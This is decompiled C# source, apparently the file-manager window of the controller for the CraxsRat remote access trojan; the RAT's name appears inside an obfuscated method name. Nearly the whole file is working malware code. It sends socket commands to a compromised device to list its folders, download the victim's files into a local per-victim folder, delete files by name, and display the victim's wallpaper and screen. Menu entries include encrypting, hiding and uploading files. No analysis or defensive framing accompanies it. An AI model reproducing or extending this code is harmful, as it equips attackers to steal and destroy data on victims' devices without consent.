	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (this.classClient.isconnected)
			{
				if (!this.classClient.isready)
				{
					return;
				}
				this.Text = string.Format("{0} - ID:{1}", "File Manager", this.classClient.UUID);
				this.ClientPic.Image = this.classClient.Wallpaper;
				this.usrscreen.Image = reso.GetScreen(this.classClient.Screen);
				try
				{
					if (this.classClient.Row == null)
					{
					}
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			this.ClientPic.Image = Resources.disconnected;
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000594 RID: 1428 RVA: 0x0000206C File Offset: 0x0000026C
	private void ClearButton_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000595 RID: 1429 RVA: 0x0008EAC8 File Offset: 0x0008CCC8
	private void Button2_Click(object sender, EventArgs e)
	{
		if (this.DGVDATA.SelectedRows.Count > 0)
		{
			foreach (object obj in this.DGVDATA.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Tag.ToString().Length > 1)
				{
					dataGridViewRow.Tag = "X";
					dataGridViewRow.Cells[4].Value = "Cancelled..";
					dataGridViewRow.DefaultCellStyle.ForeColor = Color.Red;
					dataGridViewRow.Dispose();
				}
			}
		}
	}

	// Token: 0x06000596 RID: 1430 RVA: 0x0000206C File Offset: 0x0000026C
	private void Usrbtry_MouseEnter(object sender, EventArgs e)
	{
	}

	// Token: 0x06000597 RID: 1431 RVA: 0x0000206C File Offset: 0x0000026C
	private void ClientPic_MouseEnter(object sender, EventArgs e)
	{
	}

	// Token: 0x06000598 RID: 1432 RVA: 0x0008EB8C File Offset: 0x0008CD8C
	private void MetroSetBadge1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.Downpic.Tag.ToString(), "off", false) == 0)
		{
			this.Downpic.Tag = "on";
			this.ClearButton.Enabled = true;
			this.ClearButton.Visible = true;
			this.cancelbtn.Enabled = true;
			this.cancelbtn.Visible = true;
			this.DGVDATA.BringToFront();
		}
		else
		{
			this.Downpic.Tag = "off";
			this.ClearButton.Enabled = false;
			this.ClearButton.Visible = false;
			this.cancelbtn.Enabled = false;
			this.cancelbtn.Visible = false;
			this.DGVDATA.SendToBack();
		}
	}

	// Token: 0x06000599 RID: 1433 RVA: 0x0008EC54 File Offset: 0x0008CE54
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsvsdegvdsergef(object sender, EventArgs e)
	{
		try
		{
			string path = Conversions.ToString(Operators.ConcatenateObject(this.classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[]
			{
				"/",
				"\\"
			}, null, null, null)));
			int num = 0;
			if (Directory.Exists(path))
			{
				num = Directory.GetFiles(path, "*.*").Count<string>();
			}
			int value = checked(this.DGV0.Rows.Count - 1);
			int count = this.Clipboard.Count;
			string language = RegistryHandler.Get_Language();
			string a = language;
			if (!(a == "EN"))
			{
				if (!(a == "CN"))
				{
					if (a == "AR")
					{
						this.CountText.Text = "العدد " + Conversions.ToString(value);
						this.Selecttext.Text = "المحدد " + Conversions.ToString(this.DGV0.SelectedRows.Count);
						this.seentext.Text = "تمت مشاهدته " + num.ToString() + ((count > 0) ? (Strings.Space(10) + "في المحفظة " + Conversions.ToString(this.Clipboard.Count)) : "");
					}
				}
				else
				{
					this.CountText.Text = "全部的 " + Conversions.ToString(value);
					this.Selecttext.Text = "选择 " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					this.seentext.Text = "见过 " + num.ToString() + ((count > 0) ? (Strings.Space(10) + "剪贴板 " + Conversions.ToString(this.Clipboard.Count)) : "");
				}
			}
			else
			{
				this.CountText.Text = "ALL " + Conversions.ToString(value);
				this.Selecttext.Text = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
				this.seentext.Text = "Seen " + num.ToString() + ((count > 0) ? (Strings.Space(10) + "Clipboard " + Conversions.ToString(this.Clipboard.Count)) : "");
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600059A RID: 1434 RVA: 0x00002DBD File Offset: 0x00000FBD
	private void Viwimage_MouseEnter(object sender, EventArgs e)
	{
		this.LoadVideo();
	}

	// Token: 0x0600059B RID: 1435 RVA: 0x00002D9D File Offset: 0x00000F9D
	private void Viwimage_MouseLeave_1(object sender, EventArgs e)
	{
		this.ShowVideo = false;
		this.thumb_chk.Checked = true;
		this.thumb_chk.Refresh();
	}

	// Token: 0x0600059C RID: 1436 RVA: 0x0008B898 File Offset: 0x00089A98
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA,
					"get0"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x0600059D RID: 1437 RVA: 0x0008BAE4 File Offset: 0x00089CE4
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA,
					"get3"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x0600059E RID: 1438 RVA: 0x0008BA20 File Offset: 0x00089C20
	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA,
					"get2"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x0600059F RID: 1439 RVA: 0x0008EF00 File Offset: 0x0008D100
	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				Operators.ConcatenateObject(string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA
				}), this.Pback(Conversions.ToString(this.DGV0.Tag))),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060005A0 RID: 1440 RVA: 0x0008EFD8 File Offset: 0x0008D1D8
	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				Operators.ConcatenateObject(string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA
				}), this.DGV0.Tag),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060005A1 RID: 1441 RVA: 0x0008F0A4 File Offset: 0x0008D2A4
	private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						if (this.classClient != null)
						{
							string[] array = this.classClient.Keys.Split(new char[]
							{
								':'
							});
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"download",
									Data.SPL_DATA,
									array[0],
									Data.SPL_DATA,
									array[1],
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									SecurityKey.down_info,
									"File",
									this.classClient.UUID,
									Data.SPL_DATA,
									SecurityKey.downByte,
									"File",
									this.classClient.UUID,
									Data.SPL_DATA,
									"File",
									this.classClient.UUID
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
			}
		}
	}

	// Token: 0x060005A2 RID: 1442 RVA: 0x0008F308 File Offset: 0x0008D508
	private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
	{
		if (this.viwimage.Image != null)
		{
			Bitmap bitmap = new Bitmap(this.viwimage.Image);
			bitmap.RotateFlip(RotateFlipType.Rotate90FlipNone);
			this.viwimage.Image = bitmap;
		}
	}

	// Token: 0x060005A3 RID: 1443 RVA: 0x0008BCF8 File Offset: 0x00089EF8
	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			string text = this.classClient.FolderUSER + "\\Downloads";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
		}
	}

	// Token: 0x060005A4 RID: 1444 RVA: 0x0008F34C File Offset: 0x0008D54C
	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		try
		{
			if (this.DGVDATA.SelectedRows.Count > 0)
			{
				foreach (object obj in this.DGVDATA.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					if (dataGridViewRow.Tag.ToString().Length > 1)
					{
						dataGridViewRow.Tag = "X";
						dataGridViewRow.Cells[4].Value = "Cancelled..";
						dataGridViewRow.DefaultCellStyle.ForeColor = Color.Red;
						dataGridViewRow.Dispose();
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060005A5 RID: 1445 RVA: 0x00002DC5 File Offset: 0x00000FC5
	private void Clearsrchbtn_Click(object sender, EventArgs e)
	{
		this.searchtext.Text = "";
	}

	// Token: 0x060005A6 RID: 1446 RVA: 0x0008F424 File Offset: 0x0008D624
	private void Searchtext_TextChanged(object sender, EventArgs e)
	{
		this.searchbefore.Clear();
		if (!string.IsNullOrEmpty(this.searchtext.Text))
		{
			this.clearsrchbtn.Visible = true;
		}
		else
		{
			this.clearsrchbtn.Visible = false;
		}
	}

	// Token: 0x060005A7 RID: 1447 RVA: 0x0008F46C File Offset: 0x0008D66C
	private void Searchbtn_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.Rows.Count < 1)
			{
				EagleAlert.Showinformation("No Data Found");
			}
			else if (string.IsNullOrEmpty(this.searchtext.Text))
			{
				EagleAlert.Showinformation("Enter Text to search First");
			}
			else
			{
				bool flag = true;
				int num = this.DGV0.Rows.Count - 1;
				for (int num2 = 0; num2 <= num; num2++)
				{
					try
					{
						DataGridViewRow dataGridViewRow = this.DGV0.Rows[num2];
						if (!this.searchbefore.Contains(dataGridViewRow))
						{
							flag = false;
							if (dataGridViewRow.Cells[1].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[2].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[3].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[4].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[5].Value.ToString().Contains(this.searchtext.Text.ToLower()))
							{
								this.DGV0.ClearSelection();
								this.DGV0.FirstDisplayedScrollingRowIndex = num2;
								dataGridViewRow.Selected = true;
								this.searchbefore.Add(dataGridViewRow);
								break;
							}
						}
					}
					catch (Exception)
					{
					}
				}
				if (flag)
				{
					EagleAlert.Showinformation("No Result Found");
				}
			}
		}
	}

	// Token: 0x060005A8 RID: 1448 RVA: 0x0008F670 File Offset: 0x0008D870
	private void ClearButton_Click_1(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (this.DGVDATA.Rows.Count > 0)
				{
					int num = this.DGVDATA.Rows.Count - 1;
					for (int num2 = num; num2 >= 0; num2 += -1)
					{
						try
						{
							DataGridViewRow dataGridViewRow = this.DGVDATA.Rows[num2];
							if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(dataGridViewRow.Tag == null, Operators.CompareObjectEqual(dataGridViewRow.Tag, "f", false)), Operators.CompareObjectEqual(dataGridViewRow.Tag, "x", false)), Operators.CompareObjectEqual(dataGridViewRow.Tag, "X", false))))
							{
								try
								{
									string key = dataGridViewRow.Cells[0].Value.ToString();
									object objectValue = RuntimeHelpers.GetObjectValue(reso.GETKEY(key, this.DownStreams));
									FileStream fileStream = (FileStream)NewLateBinding.LateIndexGet(objectValue, new object[]
									{
										0
									}, null);
									if (fileStream != null)
									{
										fileStream.Dispose();
										fileStream.Close();
									}
								}
								catch (Exception)
								{
								}
								this.DGVDATA.Rows.RemoveAt(dataGridViewRow.Index);
								this.Downloadnum.Text = this.DGVDATA.Rows.Count.ToString();
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060005A9 RID: 1449 RVA: 0x0008F830 File Offset: 0x0008DA30
	private void sButton1_Click(object sender, EventArgs e)
	{
		string text = this.searchtext.Text;
		if (!string.IsNullOrEmpty(text))
		{
			string text2 = "del0";
			string text3 = text;
			if (this.classClient != null)
			{
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						text2,
						Data.SPL_DATA,
						text3
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
		}
	}

	// Token: 0x04000777 RID: 1911
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ctxMenu")]
	private ContextMenuStrip _ctxMenu;

	// Token: 0x04000778 RID: 1912
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DownloadToolStripMenuItem")]
	private ToolStripMenuItem _DownloadToolStripMenuItem;

	// Token: 0x04000779 RID: 1913
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UploadToolStripMenuItem")]
	private ToolStripMenuItem _UploadToolStripMenuItem;

	// Token: 0x0400077A RID: 1914
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FolderDownloadsToolStripMenuItem")]
	private ToolStripMenuItem _FolderDownloadsToolStripMenuItem;

	// Token: 0x0400077B RID: 1915
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EncryptToolStripMenuItem")]
	private ToolStripMenuItem _EncryptToolStripMenuItem;

	// Token: 0x0400077C RID: 1916
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DecodeToolStripMenuItem")]
	private ToolStripMenuItem _DecodeToolStripMenuItem;

	// Token: 0x0400077D RID: 1917
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	// Token: 0x0400077E RID: 1918
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EditToolStripMenuItem")]
	private ToolStripMenuItem _EditToolStripMenuItem;

	// Token: 0x0400077F RID: 1919
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ZipToolStripMenuItem")]
	private ToolStripMenuItem _ZipToolStripMenuItem;

	// Token: 0x04000780 RID: 1920
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UnZipToolStripMenuItem")]
	private ToolStripMenuItem _UnZipToolStripMenuItem;

	// Token: 0x04000781 RID: 1921
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RenameToolStripMenuItem")]
	private ToolStripMenuItem _RenameToolStripMenuItem;

	// Token: 0x04000782 RID: 1922
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HideToolStripMenuItem")]
	private ToolStripMenuItem _HideToolStripMenuItem;

	// Token: 0x04000783 RID: 1923
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ShowToolStripMenuItem")]
	private ToolStripMenuItem _ShowToolStripMenuItem;

	// Token: 0x04000784 RID: 1924
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AddFilesToolStripMenuItem")]
	private ToolStripMenuItem _AddFilesToolStripMenuItem;

	// Token: 0x04000785 RID: 1925
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OpenToolStripMenuItem")]
	private ToolStripMenuItem _OpenToolStripMenuItem;

	// Token: 0x04000786 RID: 1926
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	// Token: 0x04000787 RID: 1927
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CutToolStripMenuItem")]
	private ToolStripMenuItem _CutToolStripMenuItem;

	// Token: 0x04000788 RID: 1928
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem")]
	private ToolStripMenuItem _CopyToolStripMenuItem;

	// Token: 0x04000789 RID: 1929
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PasteToolStripMenuItem")]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	// Token: 0x0400078A RID: 1930
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SetWallpaperToolStripMenuItem")]
	private ToolStripMenuItem _SetWallpaperToolStripMenuItem;

	// Token: 0x0400078B RID: 1931
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PlaySoundToolStripMenuItem")]
	private ToolStripMenuItem _PlaySoundToolStripMenuItem;

	// Token: 0x0400078C RID: 1932
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	// Token: 0x0400078D RID: 1933
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientPic")]
	private PictureBox _ClientPic;

	// Token: 0x0400078E RID: 1934
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Usrbtry")]
	private PictureBox _Usrbtry;

	// Token: 0x0400078F RID: 1935
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	// Token: 0x04000790 RID: 1936
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viwimage")]
	private PictureBox _viwimage;

	// Token: 0x04000791 RID: 1937
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("sdbtn")]
	private DrakeUIButtonIcon _sdbtn;

	// Token: 0x04000792 RID: 1938
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("dcmbtn")]
	private DrakeUIButtonIcon _dcmbtn;

	// Token: 0x04000793 RID: 1939
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("picbtn")]
	private DrakeUIButtonIcon _picbtn;

	// Token: 0x04000794 RID: 1940
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	// Token: 0x04000795 RID: 1941
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	// Token: 0x04000796 RID: 1942
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon6")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon6;

	// Token: 0x04000797 RID: 1943
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon7")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon7;

	// Token: 0x04000798 RID: 1944
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon8")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon8;

	// Token: 0x04000799 RID: 1945
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DrakeUIDataGridView _DGV0;

	// Token: 0x0400079A RID: 1946
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("cancelbtn")]
	private DrakeUIButtonIcon _cancelbtn;

	// Token: 0x0400079B RID: 1947
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClearButton")]
	private DrakeUIButtonIcon _ClearButton;

	// Token: 0x0400079C RID: 1948
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearsrchbtn")]
	private DrakeUIAvatar _clearsrchbtn;

	// Token: 0x0400079D RID: 1949
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	// Token: 0x0400079E RID: 1950
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchbtn")]
	private DrakeUIAvatar _searchbtn;

	// Token: 0x0400079F RID: 1951
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Downpic")]
	private DrakeUIButtonIcon _Downpic;

	// Token: 0x040007A0 RID: 1952
	public TcpClient Client;

	// Token: 0x040007A1 RID: 1953
	public Client classClient;

	// Token: 0x040007A2 RID: 1954
	public string Title;

	// Token: 0x040007A3 RID: 1955
	public string ver;

	// Token: 0x040007A4 RID: 1956
	public int Correntindex;

	// Token: 0x040007A5 RID: 1957
	public Collection paths_indexs;

	// Token: 0x040007A6 RID: 1958
	private string FSize;

	// Token: 0x040007A7 RID: 1959
	private string Q;

	// Token: 0x040007A8 RID: 1960
	public bool ShowVideo;

	// Token: 0x040007A9 RID: 1961
	public string DownFolder;

	// Token: 0x040007AA RID: 1962
	public Collection DownStreams;

	// Token: 0x040007AB RID: 1963
	private string FileDirectory;

	// Token: 0x040007AC RID: 1964
	private List<Array> Clipboard;

	// Token: 0x040007AD RID: 1965
	private bool isfront;

	// Token: 0x040007AE RID: 1966
	private string KEYsx;

	// Token: 0x040007AF RID: 1967
	private PictureBox tempImage;

	// Token: 0x040007B0 RID: 1968
	private List<DataGridViewRow> searchbefore;
}
